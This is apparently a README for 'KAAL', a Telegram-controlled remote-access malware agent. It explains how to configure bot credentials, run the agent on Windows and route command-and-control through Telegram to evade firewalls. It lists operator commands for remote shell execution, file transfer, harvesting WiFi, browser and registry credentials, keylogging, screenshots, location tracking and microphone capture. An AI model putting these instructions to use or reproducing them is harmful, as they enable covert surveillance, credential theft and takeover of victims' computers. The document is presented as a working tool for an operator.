# KAAL Proxy Agent - Setup Guide

## 🎯 What Is This?
`test_agent_proxy.py` is a relay agent that connects to your C2 server **through Telegram** instead of direct HTTP. This allows:
- **Firewall bypassing** (uses Telegram API, port 443)
- **Encrypted communication** (Telegram's encryption)
- **Command/control via Telegram chat**

## 📋 Prerequisites
1. **Telegram Bot Token**
   - Open Telegram and search for `@BotFather`
   - Send `/newbot` and follow instructions
   - Copy the bot token (looks like `123456789:ABCdefGHI...`)

2. **Your Telegram Chat ID**
   - Search for `@userinfobot` on Telegram
   - Send `/start` to get your numeric chat ID

## 🛠️ Configuration
Edit `test_agent_proxy.py` and update:
```python
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"   # From @BotFather
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"         # From @userinfobot
```

## 🚀 Running the Agent

### Windows:
```bash
python malware\Kaal\test_agent_proxy.py
```

### What You'll See:
```
=== KAAL Proxy Agent (Telegram Relay) ===
Bot Token: 123456789:ABCdefGH...
Polling for commands...
[+] Registered via Telegram relay
```

## 📱 Sending Commands
Open your Telegram chat with the bot and use `/cmd` prefix:

```
/cmd exec whoami
/cmd ls
/cmd creds
/cmd screenshot
/cmd keylog_start
```

## ✅ Supported Commands
ALL features from `test_agent_direct.py` work:
- **Shell**: `/cmd exec <command>`
- **Files**: `/cmd ls`, `/cmd cd`, `/cmd download`, `/cmd upload`
- **Creds**: `/cmd creds` (WiFi, Browser, Registry)
- **Keylogger**: `/cmd keylog_start`, `/cmd keylog_stop`
- **Screenshot**: `/cmd screenshot`
- **Location**: `/cmd location`
- **Audio**: `/cmd mic 5`

## 🔧 Architecture
```
Agent → Telegram API → Your Telegram → [Manual Relay] → C2 Server
```

**Note**: This is a proof-of-concept. For production, you'd build a relay bridge that forwards commands from C2 to Telegram and results back.

## 🔐 Security Notes
- Bot tokens are **sensitive** - don't commit to Git
- Commands are visible in Telegram chat history
- Results are truncated to 3500 chars (Telegram limit)

## 🐛 Troubleshooting
**"Telegram poll error"**: Check your internet connection and bot token
**"Unknown command"**: Ensure you use`/cmd` prefix
**No response**: Verify `TELEGRAM_CHAT_ID` matches your actual chat ID
